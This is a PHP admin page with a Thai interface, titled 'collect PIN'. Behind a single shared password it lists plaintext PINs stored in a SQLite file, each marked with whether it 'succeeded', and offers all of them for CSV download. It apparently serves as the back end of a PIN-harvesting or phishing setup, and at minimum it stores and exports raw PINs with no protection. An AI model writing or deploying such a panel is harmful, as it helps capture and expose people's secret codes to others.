<?php
session_start(); // เริ่ม session เพื่อจัดการสถานะแอดมิน
require_once __DIR__ . '/api/config.php'; // ต้องมี ADMIN_PASSWORD

$loggedIn = !empty($_SESSION['admin']);
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_password'])) {
    $pw = trim($_POST['admin_password']);
    if ($pw === ADMIN_PASSWORD) {
        $_SESSION['admin'] = true;
        $loggedIn = true;
        header('Location: admin.php');
        exit;
    } else {
        $error = 'รหัสผ่านไม่ถูกต้อง';
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: admin.php');
    exit;
}

$dbFile = __DIR__ . '/data/pins.sqlite';
$rows = [];
if ($loggedIn) {
    if (file_exists($dbFile)) {
        try {
            $pdo = new PDO('sqlite:' . $dbFile);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if (isset($_GET['action']) && $_GET['action'] === 'download') {
                exportCsv($pdo);
            }

            $stmt = $pdo->query('SELECT id, pin, success, created_at FROM pins ORDER BY id DESC LIMIT 1000');
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        } catch (Exception $e) {
            $error = 'ไม่สามารถเชื่อมต่อฐานข้อมูลได้: ' . $e->getMessage();
            $rows = [];
        }
    } else {
        $rows = [];
    }
}

function exportCsv(PDO $pdo) {
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="pins_export.csv"');
    echo "\xEF\xBB\xBF"; // BOM ให้ Excel อ่านได้
    $out = fopen('php://output', 'w');
    fputcsv($out, ['id','pin','success','created_at']);
    $stmt = $pdo->query('SELECT id, pin, success, created_at FROM pins ORDER BY id DESC');
    while ($r = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($out, [$r['id'],$r['pin'],$r['success'],$r['created_at']]);
    }
    fclose($out);
    exit;
}
?>
<!doctype html>
<html lang="th">
<head>
    <meta charset="utf-8">
    <title>Admin - เก็บ PIN</title>
    <style>
        body{font-family:Anuphan,system-ui,Arial;padding:1rem;}
        table{width:100%;border-collapse:collapse;}
        th,td{padding:.5rem;border:1px solid #ccc;text-align:left;}
        .error{color:#d00;}
        .note{font-size:.9rem;color:#555;}
    </style>
</head>
<body>
    <h1>หน้าจัดการ</h1>
    <?php if(!$loggedIn): ?>
        <?php if($error): ?><p class="error"><?=htmlspecialchars($error)?></p><?php endif; ?>
        <form method="post">
            <label>รหัสผ่าน: <input type="password" name="admin_password"></label>
            <button type="submit">เข้าสู่ระบบ</button>
        </form>
        <p class="note">หมายเหตุ: รหัสเริ่มต้นสามารถเปลี่ยนได้ที่ <code>api/config.php</code></p>
    <?php else: ?>
        <p><a href="admin.php?action=logout">ออกจากระบบ</a> | <a href="admin.php?action=download">ดาวน์โหลด CSV</a></p>
        <?php if($error): ?><p class="error"><?=htmlspecialchars($error)?></p><?php endif; ?>
        <?php if(empty($rows)): ?>
            <p>ยังไม่มีข้อมูล</p>
        <?php else: ?>
            <table>
                <thead><tr><th>ID</th><th>PIN</th><th>สำเร็จ</th><th>เวลา</th></tr></thead>
                <tbody>
                <?php foreach($rows as $r): ?>
                    <tr>
                        <td><?=htmlspecialchars($r['id'])?></td>
                        <td><?=htmlspecialchars($r['pin'])?></td>
                        <td><?= $r['success']? '✔️':'✖️' ?></td>
                        <td><?=htmlspecialchars($r['created_at'])?></td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    <?php endif; ?>
</body>
</html>